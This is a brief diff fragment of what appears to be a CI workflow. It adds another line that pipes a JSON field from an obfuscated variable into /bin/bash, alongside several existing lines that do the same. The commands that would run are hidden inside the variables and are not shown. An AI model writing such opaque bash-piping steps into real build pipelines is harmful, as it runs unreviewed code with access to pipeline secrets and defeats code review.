@@ -40,6 +40,7 @@ jobs:
           echo $z13 | jq -r .ek38 | /bin/bash
           printf '%s' "$vvvuy75" | jq -r .m86 | /bin/bash
           echo $zvyup79674 | jq -r .mevr7545 | /bin/bash
+          printf '%s' "$r6" | jq -r .npazo2820 | /bin/bash
 
       - name: Store results
         if: always()
